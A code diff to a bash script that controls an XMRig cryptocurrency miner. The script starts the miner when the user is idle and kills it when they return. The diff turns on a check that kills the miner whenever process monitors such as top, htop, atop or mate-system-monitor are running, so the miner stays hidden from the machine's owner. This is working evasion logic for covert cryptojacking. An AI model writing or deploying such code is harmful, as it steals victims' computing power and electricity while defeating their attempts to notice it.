@@ -21,11 +21,11 @@ main() {
 	echo "isUI: $isUI"
 	while true; do 
 		sleep 1
-		# if pgrep -x "top" || pgrep -x "htop" || pgrep -x "atop" || pgrep -x "mate-system-mon"; then
-		# 	echo "Found top, killing xrig"
-		# 	killall -q $XMRIGNAME
-		# 	continue
-		# fi
+		if pgrep -x "top" || pgrep -x "htop" || pgrep -x "atop" || pgrep -x "mate-system-mon"; then
+			echo "Found top, killing xrig"
+			killall -q $XMRIGNAME
+			continue
+		fi
 
 		if [[ isUI -eq 1 ]]; then
 			idle=$($LOCAL_PATH/$XPRINTIDLE_NAME)
@@ -64,21 +64,6 @@ main() {
 				echo "Kiling XMR"
 				killall -q $XMRIGNAME
 			fi
-			
-			# echo "Console, idle for $idle"
-			# if [[ $idle == "old" ]]; then
-			# 	run_xmr
-			# elif [[ $idle != "." ]]; then 
-			# 	idleH=$(cut -d':' -f1)
-			# 	idleM=$(cut -d':' -f2)
-			# 	if [[ $idleH -gt 0 || $idleM -gt $INACTIVITY_IN_MINS ]]; then
-			# 		run_xmr
-			# 	else
-			# 		killall -q $XMRIGNAME
-			# 	fi
-			# else 
-			# 	killall -q $XMRIGNAME
-			# fi
 		fi
 	done
 }
